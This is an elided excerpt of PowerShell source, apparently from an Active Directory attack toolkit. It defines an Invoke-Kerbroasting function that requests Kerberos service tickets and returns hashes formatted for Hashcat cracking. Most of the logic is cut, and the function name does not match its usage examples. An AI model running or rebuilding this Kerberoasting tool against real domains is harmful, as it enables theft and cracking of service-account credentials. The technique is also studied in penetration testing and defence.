...
function Get-SPNTicket {
    ...
    Param (
        ...
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerV.User' })]
        [Object[]]
        $User,
...
function Invoke-Kerbroasting {
    <#
    .SYNOPSIS

    Requests service tickets for kerbroast-able accounts and returns extracted ticket hashes.
    ...
    Invoke-kerbroast -Domain dev.testlab.local | ConvertTo-CSV -NoTypeInformation
    ...
    Invoke-kerbroast -AdminCount -OutputFormat Hashcat | fl
    ...
    PROCESS {
        if ($UserSearcher) {
            ...
            Write-Verbose "Invoke-kerbroast search filter string: $($UserSearcher.filter)"

            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Insert(0, 'PowerV.User')
                $User
